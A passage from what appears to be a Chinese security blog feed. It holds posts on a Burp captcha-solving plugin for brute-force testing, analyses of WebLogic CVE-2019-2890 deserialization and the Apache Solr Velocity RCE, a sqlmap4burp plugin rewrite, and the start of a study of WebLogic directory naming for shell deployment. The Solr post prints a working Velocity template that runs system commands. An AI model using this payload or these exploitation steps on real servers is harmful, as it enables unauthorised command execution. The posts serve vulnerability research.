src="/articles/2019/burp-captcha-killer-usage/step2-2.png" alt="接口请求模版设置"></p><table><thead><tr><th align="center">ID</th><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left"><code>&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;</code></td><td align="left">代表验证码图片原二进制内容</td></tr><tr><td align="center">2</td><td align="left"><code>&lt;@URLENCODE&gt;&lt;/@URLENCODE&gt;</code></td><td align="left">对标签内的内容进行url编码</td></tr><tr><td align="center">3</td><td align="left"><code>&lt;@BASE64&gt;&lt;/@BASE64&gt;</code></td><td align="left">对标签内的内容进行base64编码</td></tr></tbody></table><p>最后点击“识别”即可获取到接口返回的数据包，同时在<code>request raw</code>可以看到调用接口最终发送的请求包。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-3.png" alt="模版被渲染为最终的请求"></p><h2 id="0x03-Step3-设置用于匹配识别结果的规则"><a href="#0x03-Step3-设置用于匹配识别结果的规则" class="headerlink" title="0x03 Step3:设置用于匹配识别结果的规则"></a>0x03 Step3:设置用于匹配识别结果的规则</h2><p>通过上一步我们获取到了识别接口的返回结果，但是插件并不知道返回结果中，哪里是真正的识别结果。插件提供了4中方式进行匹配，可以根据具体情况选择合适的。</p><table><thead><tr><th align="center">ID</th><th align="left">规则类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">Repose data</td><td align="left">这种规则用于匹配接口返回包内容直接是识别结果</td></tr><tr><td align="center">2</td><td align="left">Regular expression</td><td align="left">正则表达式,适合比较复杂的匹配。比如接口返回包<code>{&quot;coede&quot;:1,&quot;result&quot;:&quot;abcd&quot;}</code>说明abcd是识别结果，我们可以编写规则为<code>result&quot;:&quot;(.*?)&quot;\}</code></td></tr><tr><td align="center">3</td><td align="left">Define the start and end positions</td><td align="left">定义开始和结束位置,使用上面的例子，可以编写规则<code>{&quot;start&quot;:21,&quot;end&quot;:25}</code></td></tr><tr><td align="center">4</td><td align="left">Defines the start and end strings</td><td align="left">定义开始和结束字符，使用上面的例子，可以编写规则为<code>{&quot;start&quot;:&quot;result\&quot;:\&quot;,&quot;end&quot;:&quot;\&quot;\}&quot;}</code></td></tr></tbody></table><p>通过分析我们知道，接口返回的json数据中，字段<code>words</code>的值为识别结果。我们这里使用<code>Regular expression</code>(正则表达式)来匹配，然后选择<code>yzep</code>右键<code>标记为识别结果</code>，系统会自动生成正则表达式规则<code>&quot; (.*?)&quot;\}\]</code>。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step3-1.png" alt="设置匹配方式和自动生成规则"></p><p>注意：若右键标记自动生成的规则匹配不精确，可以人工进行微调。比如该例子中可以微调规则为<code>&quot;words&quot;\: &quot;(.*?)&quot;\}</code>将更加准确！</p><p>到达这步建议将配置好常用接口的url，数据包已经匹配规则保存为模版，方便下次直接通过右键<code>模板库</code>中快速设置。同时插件也有默认的模版供大家使用与修改。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step3-2.png" alt="保存设置好的配置，方便下次快速配置"></p><h2 id="0x04-Step4-在Intruder模块调用"><a href="#0x04-Step4-在Intruder模块调用" class="headerlink" title="0x04 Step4:在Intruder模块调用"></a>0x04 Step4:在Intruder模块调用</h2><p>配置好各项后，可以点击<code>锁定</code>对当前配置进行锁定，防止被修改导致爆破失败！接着安装以下步骤进行配置</p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-1.png" alt="设置Intruder的爆破模式和payload位置"></p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-2.png" alt="验证码payload选择有插件来生成"></p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-3.png" alt="进行爆破，可以通过对比识别结果看出识别率"></p><h2 id="0x05-使用小案例"><a href="#0x05-使用小案例" class="headerlink" title="0x05 使用小案例"></a>0x05 使用小案例</h2><p>后续将通过小案例来演示，如何通过captcha-killer让burp使用上各种技术识别验证码(免费方案)，敬请期待！</p><ul><li>《captcha-killer调用tesseract-ocr识别验证码》[待发布]</li><li>《captcha-killer调用完美识别验证码系统》[待发布]</li><li>《captcha-killer调用百度ocr识别验证码》[待发布]</li><li>《capatch-killer+机器学习识别验证码》[待发布]</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic t3反序列化漏洞(CVE-2019-2890)分析</title>
      <link href="/articles/2019/cve-2019-2890-vulnerability-analysis/"/>
      <url>/articles/2019/cve-2019-2890-vulnerability-analysis/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞背景"><a href="#0x01-漏洞背景" class="headerlink" title="0x01 漏洞背景"></a>0x01 漏洞背景</h2><p>在WebLogic官方发布的10月份安全补丁中，包含了由Venustech ADLab提交的CVE-2019-2890的修复。该漏洞通过T3协议发送恶意的反序列化数据绕过了Weblogic的黑名单，成功反序列化执行任意命令。通过官方公告可知，该漏洞的利用条件是需要认证。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/965305D2-2F45-4575-9A16-18A076A01A08.png" alt="官方公告"></p><h2 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h2><ul><li>Weblogic 10.3.6.0.0</li><li>Weblogic 12.1.3.0.0</li><li>Weblogic 12.2.1.3.0</li></ul><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>下面以10.3.6.0作为分析版本。问题出现在<code>PersistentContext</code>类上，通过查看继承关系我们知道<code>PersistentContext</code>类实现了序列化接口<code>Serializable</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E9257EC7-5283-4A10-B5A3-48768E40879D.png" alt="PersistentContext类继承关系"></p><p>我们来看看它的<code>readObject</code>方法，将<code>ObjectInputStream</code>类对象<code>var1</code>传入<code>readSubject</code>方法。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E970A5E7-E834-400C-9984-5C3507948B64.png" alt="readObject方法"></p><p>跟进<code>readSubject</code>方法发现，会先从<code>var1</code>中读取反序列化数据当中的对象数据。然后调用<code>EncryptionUtil.decrypt</code>方法进行解密，最后解密后的数据被用于反序列化为对象。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/B61188D2-9A6F-4DAC-892B-C1144A88D230.png" alt="readSubject方法"></p><p>至此我们知道<code>PersistenContext</code>序列化数据中还携带了其他对象反序列化后的加密数据。如果我们在序列化<code>PersistentContext</code>时，将恶意对象反序列化数据先加密，然后<code>writeObject</code>，就可以让其携带恶意对象，绕过Weblogic黑名单进行反序列化了。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>根据以上思路，我们编写一个携带恶意对象的<code>PersistenContext</code>类。只需修改下原来代码中的<code>writeSubject</code>方法为如下，其中<code>Poc.getObject()</code>就是我们的恶意对象。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/5FB1320C-A1C4-43F0-96C5-7D21EE70E199.png" alt="修改writeSubject方法代码"></p><p>在<strong>进行序列化之前我们要处理四个问题</strong>。<strong>第一个问题是创建PersistenContext对象报错</strong>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/57A3655A-F776-49C2-BAA7-0F9F03198140.png" alt="创建PersistenContext对象报错信息"></p><p>这是因为<code>PersistenContext</code>初始化时调用了<code>SecurityServiceManager.isKernelIdentity()</code>进行内核身份判断。<code>isKernelIdentity</code>方法无论如何都会抛出一个<code>NotSupportedException</code>异常，导致我们序列化被终止。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E816991E-9EA3-468E-85FA-1C9175314834.png" alt="SecurityServiceManager.isKernelIdentity()方法"></p><p>我们可以将其注释掉</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/3E6D0521-8AB3-45E2-B02D-803BBF515919.png" alt="PersistenContext构造方法要修改的代码"></p><p><strong>第二个问题是反序列化PersistenContext类会出现卡死现象</strong>。这是因为<code>PersistenContext</code>等相关的类都会有一个<code>AuthenticatedSubject</code>静态对象要初始化。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/A505C25E-EDF1-412B-8EDE-C7ABE8765F83.png" alt="静态AuthenticatedSubject内核id对象"></p><p>初始化时会进入到如下代码。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/F4F81B39-2D22-4F10-84C2-FF533AB55003.png" alt="导致卡死的代码段"></p><p>我们需要<code>ceClient</code>变量为<code>true</code>，否则会一直进循环执行<code>ceSubjectManagerLock.wait()</code>进行等待，无法序列化！而<code>ceClient</code>是从系统属性<code>com.bea.core.internal.client</code>获取的，所以在序列化之前需要将该属性设置为<code>true</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/89C83A3D-8F6F-4C4E-890B-9090929D60F9.png" alt="ceClient变量的赋值"></p><p><strong>第三个问题是恶意对象没有被加密</strong>。这是因为在调用<code>EncryptionUtil.encrypt</code>方法加密时，会根据<code>Kernel.isServer()</code>为<code>true</code>时才会进行加密，否则返回原数据。<br>因此加密之前需要调用<code>KernelStatus.setIsServer(true)</code>设置状态为<code>true</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/00CBD49C-24DD-45CB-8B96-5C96F59D2543.png" alt="加密时的判断"></p><p><strong>第四个问题，加密时需要<code>SerializedSystemIni.dat</code>文件。</strong> 我们需要目标服务器weblogic当前使用域下该文件放到我们poc的根目录。这也是官方将这个漏洞划分为需要认证的原因。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/0E16C9FC-DF1D-4162-8551-A99F81CDB316.png" alt="加密时需要SerializedSystemIni.dat文件"></p><p>解决完这四个问题，就可以将<code>PersistenContext</code>对象反序列化为文件了。最后通过t3协议发送反序列化数据给Weblogic，即可执行任意命令。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/B861234A-24EA-49C9-BAD8-B2E0749EF2E3.png" alt="序列化PersistenContext对象为文件"><br><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/364E764C-5247-4FB5-9225-DDD9290E9660.png" alt="漏洞利用演示"></p><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>通过对比，发现最新补丁在反序列化时，使用<code>WSFilteringObjectInputStream</code>对要反序列化的对象进行过滤。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/751120F6-1CBF-46CE-B226-A4B45C1D29F1.png" alt="补丁修复处"></p><p><code>WSFilteringObjectInputStream</code>实现了Weblogic下的过滤接口 <code>FilteringObjectInputStream</code>。在其<code>resolveClass</code>方法中，检查要反序列化的类是不是<code>Subject</code>的子类，不是则会抛出一个非法类异常，反序列化终止！</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/597CFF7E-38BA-4A02-B977-53D5B3DE5282.png" alt="补丁修复的方式"></p><h2 id="0x06-分析总结"><a href="#0x06-分析总结" class="headerlink" title="0x06 分析总结"></a>0x06 分析总结</h2><p>这个漏洞需要满足以下两个条件，才能触发成功,较为鸡肋。</p><ol><li>Weblogic开启t3协议</li><li>可以获取到<code>SerializedSystemIni.dat</code>文件</li></ol><p>但是在实际环境中，如果部署在weblogic的站点存在<code>任意文件下载</code>或者<code>任意文件读取</code>，那么配合上该漏洞即可执行任意命令。</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.oracle.com/security-alerts/cpuoct2019.html" target="_blank" rel="noopener">Oracle Critical Patch Update Advisory - October 2019</a></li><li><a href="https://mp.weixin.qq.com/s/BW1d_NTsmXoSoOYAt8T2RQ" target="_blank" rel="noopener">WebLogic 反序列化漏洞(CVE-2019-2890)分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache solr Velocity模版远程命令执行漏洞分析</title>
      <link href="/articles/2019/apache-solr-velocity-rce-20191031/"/>
      <url>/articles/2019/apache-solr-velocity-rce-20191031/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞背景"><a href="#0x01-漏洞背景" class="headerlink" title="0x01 漏洞背景"></a>0x01 漏洞背景</h2><p>2019年10月31日，一个Solr Velocity模板远程命令执行的POC被公开到Github。经过分析测试，该POC在Solr的多个版本测试成功，包含最新版本，所以该漏洞目前处于0day状态。由于Solr默认未开启登录认证，只需请求<code>/节点名/config</code>,将配置项<code>params.resource.loader.enabled</code>设置为<code>true</code>，再构造链接即可让Solr中的<code>Velocity</code>模版引擎渲染传入的<code>恶意模版</code>，造成命令执行。下面我们来具体分析漏洞细节！</p><h2 id="0x02-知识储备"><a href="#0x02-知识储备" class="headerlink" title="0x02 知识储备"></a>0x02 知识储备</h2><p><code>Velocity</code>是一个基于Java的模板引擎，简单来说就是可以将模版渲染成html页面。下面以一个小demo来演示使用<code>Velocity</code>如何渲染出<code>test by chixiao lab</code>,方便大家快速理解<code>Velocity</code>的功能和使用。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/86DBE94C-81E6-4CE9-AD4F-084638F2106C.png" alt="一个使用Velocity来渲染模版的小Demo"></p><p>如果我们的模版<code>test.vm</code>内容改如下时，那么<code>Velocity</code>将会执行<code>id</code>命令，并显示执行结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;)</span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;))</span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;))</span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;))</span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;id&apos;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">    $str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>所以某个应用以<code>Velocity</code>作为模版渲染引擎，如果要渲染的模版内容用户可控的话，那就可以构造恶意模版来执行任意命令。本次Solr漏洞就是这种情况！</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>下面我们在<code>Solr 8.2.0</code>上以公开的POC触发的漏洞链进行分析。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/1F69B8C0-F828-494C-8166-D7AFD4AE613E.png" alt="公开的POC"></p><p>Solr在查询数据结束后，会通过<code>wt</code>参数的值来确定数据返回的格式，可以是<code>XML</code>、<code>JSON</code>、<code>CSV</code>,<code>Velocity模版渲染</code>等等。本次漏洞正是出现在查询结果用<code>Velocity模版渲染</code>。</p><p>从代码层面看，Solr会根据<code>wt</code>值，创建对应的类型的<code>QueryResponseWriter</code>来将查询数据处理成对应的格式，最后将数据<code>write()</code>到客户端。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/FE4E7C2B-87CA-4721-BBA2-945B06B92689.png" alt="根据wt确定对应的数据处理对象"></p><p>由于我们这里设置的是<code>wt=velocity</code>,故<code>QueryResponseWriter</code>类型为<code>VelocityResponseWriter</code>。我们在<code>solr-velocity-8.2.0.jar</code>包的<code>VelocityResponseWriter.write()</code>方法打断点，作为漏洞分析的开始位置。</p><p>首先Solr会先创建一个Velocity模版引擎对象<code>engine</code>，跟进<code>createEngine()</code>方法。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/1381E002-323E-4299-9A8B-F1E6A1A03F8E.png" alt="创建解析引擎对象"></p><p>发现当设置<code>&quot;params.resource.loader.enabled&quot;: &quot;true&quot;</code>时，属性<code>this.paramsResourceLoaderEnabled</code>的值为<code>true</code>，程序将创建一个参数资源加载器对象，也就是模版内容将从前端传来的参数中加载（PS:知识储备的案例是从文件加载）。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/8C442324-CF12-45EB-9FAE-E6BC63505BB8.png" alt="创建参数资源加载器"></p><p>继续跟进<code>SolrParamResourceLoader</code>类的构造方法，解析了前端传来的所有参数，并对<code>v.template.</code>开头的参数进行处理。我们请求的参数为<code>...&amp;v.template=custom&amp;v.template.custom=恶意模版内容</code>,所以<code>put</code>进入<code>templates</code>模版<code>map</code>的<code>key</code>是<code>custom.vm</code>,<code>value</code>就是我们指定的<code>恶意模版内容</code>。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/8D6900E0-292A-4D8E-B682-99B2D9B92608.png" alt="将前端传入的恶意模版保存为custom.vm"></p><p>之后在获取模版对象时,将前端传入的参数<code>v.template</code>值拼接<code>.vm</code>，也就<code>custom.vm</code>，作为要渲染的模版名。而<code>custom.vm</code>正是我们上一步传入的恶意模版。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/CD9FDCEB-B8AE-4659-8D92-08BFAA7F8896.png" alt="使用custom.vm创建模版对象"></p><p>然后我们重新回到<code>write()</code>方法，不管<code>wrapResponse</code>变量为<code>true</code>还是<code>false</code>，恶意模版都被传入<code>merge()</code>进行合并渲染，至此漏洞触发。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/CA7EFD0E-CAB8-437E-BDE4-0C683CEE5452.png" alt="合并解析模版"><br><img src="/articles/2019/apache-solr-velocity-rce-20191031/E339A09C-32EC-43B5-8E47-F38F5E573315.png" alt="漏洞触发效果"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">s00py公开的POC</a></li><li><a href="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template" target="_blank" rel="noopener">https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> solr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重构sqlmap4burp插件</title>
      <link href="/articles/2019/refactoring-sqlmap4burp/"/>
      <url>/articles/2019/refactoring-sqlmap4burp/</url>
      
        <content type="html"><![CDATA[<p>其实联动sqlmap与burp的插件挺多的，有<a href="https://code.google.com/p/gason/" target="_blank" rel="noopener">gson</a>,<a href="https://github.com/portswigger/co2" target="_blank" rel="noopener">CO2</a>,<a href="https://github.com/portswigger/sqli-py" target="_blank" rel="noopener">sqli-py</a>等等。但我独爱<a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">sqlmap4burp</a>,因为它使用超简单。原来在Windows下体验还是很ok的，自从换上mac之后就不好使了。</p><a id="more"></a><p><code>sqlmap4burp</code>项目作者已经很久没有维护了，于是打算对其进行重构。新插件就叫<code>sqlmap4burp++</code>，表示感谢原作者的思路。<code>sqlmap4burp++</code>将<code>兼容更多操作系统</code>，<code>操作更加简单</code>，<code>界面更加简洁</code>！</p><h2 id="0x01-重构之路"><a href="#0x01-重构之路" class="headerlink" title="0x01 重构之路"></a>0x01 重构之路</h2><p>下面简单记录下重构做的一些小工作。</p><h3 id="1-1-去除多余依赖"><a href="#1-1-去除多余依赖" class="headerlink" title="1.1 去除多余依赖"></a>1.1 去除多余依赖</h3><p>原插件依赖<code>commons-io-&lt;version&gt;.jar</code>,<code>commons-langs-&lt;version&gt;.jar</code>这两个jar。但查看代码只是为了可以使用<code>FileUtils.writeByteArrayToFile()</code>和<code>StringUtils.isNoneBlank()</code>两个方法。<code>sqlmap4burp++</code>使用原生Java代码实现，让插件更轻量易编译。</p><h3 id="1-2-去除JTab控件"><a href="#1-2-去除JTab控件" class="headerlink" title="1.2 去除JTab控件"></a>1.2 去除JTab控件</h3><p>现在的Burp插件很丰富，Burp suite JTab控件太多界面会显得特别臃肿。</p><p><img src="/articles/2019/refactoring-sqlmap4burp/sqlmap4burp-tab.png" alt="sqlmap4burp的JTab控件"></p><p>考虑了下该插件并非特别需要JTab面板来添加sqlmap的配置命令，于是去除JTab控件该换成如下的弹窗。</p><p><img src="/articles/2019/refactoring-sqlmap4burp/sqlmap4burp-plus-plus-dlg.png" alt="sqlmap4burp++的弹框控件"></p><h3 id="1-3-多系统支持"><a href="#1-3-多系统支持" class="headerlink" title="1.3 多系统支持"></a>1.3 多系统支持</h3><p>插件会自动将Burp的request数据包保存为<code>xxx.req</code>到java临时目录，而多系统支持无非就是<strong>在目标系统下，能弹出命令行窗口并执行我们的<code>sqlmap -r xxx.req</code>命令</strong>,但各个系统实现的方式都有所不同!</p><h4 id="1-3-1-Windows"><a href="#1-3-1-Windows" class="headerlink" title="1.3.1 Windows"></a>1.3.1 Windows</h4><p>Windows实现比较简单，只需要将sqlmap命令保存为bat脚本（sqlmap4burp.bat），然后执行以下命令：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span>.exe /c <span class="built_in">start</span> sqlmap4burp.bat</span><br></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"cmd.exe"</span>);</span><br><span class="line">cmds.add(<span class="string">"/c"</span>);</span><br><span class="line">cmds.add(<span class="string">"start"</span>);</span><br><span class="line">String batFilePath = Util.makeBatFile(<span class="string">"sqlmap4burp.bat"</span>,command); <span class="comment">//生成bat文件</span></span><br><span class="line">cmds.add(batFilePath);</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><h4 id="1-3-2-Mac-OS-X"><a href="#1-3-2-Mac-OS-X" class="headerlink" title="1.3.2 Mac OS X"></a>1.3.2 Mac OS X</h4><p>Mac下我们可以编写如下<code>osascript</code>脚本来调用Terminal并让它执行sqlmap命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tell application &quot;Terminal&quot;</span><br><span class="line">activate</span><br><span class="line">do script &quot;sqlmpa.py -r xxx.req&quot;</span><br><span class="line">end tell</span><br></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"osascript"</span>);</span><br><span class="line">cmds.add(<span class="string">"-e"</span>);</span><br><span class="line">String cmd = <span class="string">"tell application \"Terminal\" \n"</span> +</span><br><span class="line">        <span class="string">"        activate\n"</span> +</span><br><span class="line">        <span class="string">"        do script \"%s\"\n"</span> +</span><br><span class="line">        <span class="string">"end tell"</span>;</span><br><span class="line">cmds.add(String.format(cmd,command));</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><p>这里需要注意两点：</p><ul><li>第一次运行，mac会提示是否允许外部程序执行osscript，记得允许！</li><li>有时莫名其妙调用osascript不成功，我们需要确保Terminal是运行状态，如果已经是运行状态，可以重启下。</li></ul><h4 id="1-3-3-Linux"><a href="#1-3-3-Linux" class="headerlink" title="1.3.3 Linux"></a>1.3.3 Linux</h4><p>Linux下想实现弹出命令行窗口同时执行命令，我尝试了很多方法，但是都没有成功的。比较接近想要效果的方法是先将sqlmap命令写到shell脚本中（<code>sqlmap4burp.sh</code>）。然后执行如下命令来运行<code>sqlmap4burp.sh</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnome-terminal -t <span class="string">"sqlmap4burp"</span> -x bash -c <span class="string">"sh ./tmp/sqlmap4burp.sh;exec bash;"</span></span><br></pre></td></tr></table></figure><p>但使用代码去执行的时候并没有弹出<code>Terminal</code>。大家如果有解决方法，可以Fork <a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">sqlmap4burp++</a>项目贡献代码，或者发送想法到我的邮箱root#gv7.me。</p><p>目前采用临时的方法：先弹出<code>Terminal</code>窗口，然后将生成好的sqlmap命令复制剪贴板，最后手工在弹出的窗口中粘贴并执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"/bin/sh"</span>);</span><br><span class="line">cmds.add(<span class="string">"-c"</span>);</span><br><span class="line">cmds.add(<span class="string">"gnome-terminal"</span>);</span><br><span class="line">Util.setSysClipboardText(command); <span class="comment">//sqlmap命令到剪贴板</span></span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><p>完整代码请移步项目地址：<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">https://github.com/c0ny1/sqlmap4burp-plus-plus</a></p><h2 id="0x02-插件演示"><a href="#0x02-插件演示" class="headerlink" title="0x02 插件演示"></a>0x02 插件演示</h2><p>插件已经在如下系统测试成功：</p><ul><li>Windows：7,10</li><li>Mac OSX：Mojave 10.14.5</li><li>Linux：Kali2019.2</li></ul><p>请FQ观看演示，或者直接访问：<a href="https://www.youtube.com/watch?v=1RWVkztssvw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=1RWVkztssvw</a></p><iframe width="560" height="315" src="https://www.youtube.com/embed/1RWVkztssvw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2 id="0x03-参考项目"><a href="#0x03-参考项目" class="headerlink" title="0x03 参考项目"></a>0x03 参考项目</h2><ul><li><a href="https://github.com/blueroutecn/Burpsuite4Extender" target="_blank" rel="noopener">https://github.com/blueroutecn/Burpsuite4Extender</a></li><li><a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">https://github.com/difcareer/sqlmap4burp</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>weblogic“伪随机”目录生成算法探究</title>
      <link href="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/"/>
      <url>/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景说明"><a href="#0x01-背景说明" class="headerlink" title="0x01 背景说明"></a>0x01 背景说明</h2><p>我们在渗透测试过程中，可以很容易发现weblogic的    <code>server name</code>一旦被修改，其web应用有一个目录就会发生改变，导致我们在部署war拿shell时受阻。</p><p>比如bea_wls_internal这个weblogic自带web应用的web目录物理路径为：</p><p><strong>weblogic10.3.6.0\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war</strong></p><p>PS：为了后面的讨论，这里统一下概念，域名为<code>base_domain</code>,<code>server name</code>为<code>AdminServer</code>,web应用名为<code>bea_wls_internal</code>,伪随机目录为<code>9j4dqk</code>。</p><p>这时如果<code>server name</code>修改为<code>c0ny1</code>的话，经过测试其伪随机目录会变成<code>qn64ct</code>，即该web应用物理路径变为：</p><p><strong>weblogic10.3.6.0\user_projects\domains\base_domain\servers\c0ny1\tmp\_WL_internal\bea_wls_internal\qn64ct\war</strong></p><h2 id="0x02-真随机-or-伪随机？"><a href="#0x02-真随机-or-伪随机？" class="headerlink" title="0x02 真随机 or 伪随机？"></a>0x02 真随机 or 伪随机？</h2><p>在此前我一直以为改目录是随机的无法。直到我做了下面的测试，将两个域的<code>server name</code>都改为<code>c0ny1</code>。</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/test1.png" alt="bea_wls_internal随机目录变化"></p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/test2.png" alt="bea_wls9_async_reponses随机目录变化"></p><p>发现两个域下相同web应用的随机目录名相同，这说明随机数目录其实是伪随机，它是有算法来生成的。<strong>而通过结果我们很容易就判断出该随机数和域名无关，和<code>server name</code>与<code>application name</code>有关！</strong></p><h2 id="0x03-探究生成算法"><a href="#0x03-探究生成算法" class="headerlink" title="0x03 探究生成算法"></a>0x03 